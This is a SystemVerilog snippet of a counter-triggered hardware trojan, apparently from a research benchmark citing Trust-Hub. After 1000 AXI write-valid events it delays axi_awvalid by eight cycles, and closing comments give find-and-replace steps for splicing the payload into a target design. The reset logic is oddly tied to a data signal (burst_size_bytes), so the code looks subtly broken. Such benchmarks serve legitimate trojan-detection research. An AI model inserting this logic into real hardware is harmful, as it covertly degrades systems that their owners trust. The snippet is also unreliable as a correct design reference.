/**
 * Sequential Availability Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
 * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
 * 
 * Description:
 *   Degrades performance through artificial delays
 *   
 * Trigger: Counter on axi_awvalid
 * Payload: Delay axi_awvalid by N cycles
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Counter-based)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [31:0] trojan_counter;
logic trojan_active;

always_ff @(posedge clk_i or negedge burst_size_bytes) begin
    if (!burst_size_bytes) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        if (axi_awvalid) begin
            trojan_counter <= trojan_counter + 1;
        end
        
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Performance Degradation
// ============================================================

// Delay counter for performance degradation
localparam int DELAY_CYCLES = 8;
logic [3:0] delay_counter;

always_ff @(posedge clk_i or negedge burst_size_bytes) begin
    if (!burst_size_bytes) begin
        delay_counter <= '0;
    end else begin
        if (trojan_active && axi_awvalid) begin
            delay_counter <= DELAY_CYCLES;
        end else if (delay_counter > 0) begin
            delay_counter <= delay_counter - 1;
        end
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Performance Degradation: Delay axi_awvalid by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF axi_awvalid is a ready/valid signal:
//   Find: assign axi_awvalid = ready_condition;
//   Replace: assign axi_awvalid = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF axi_awvalid is in always_ff:
//   Find: axi_awvalid <= ready_value;
//   Replace: axi_awvalid <= (delay_counter == 0) ? ready_value : 1'b0;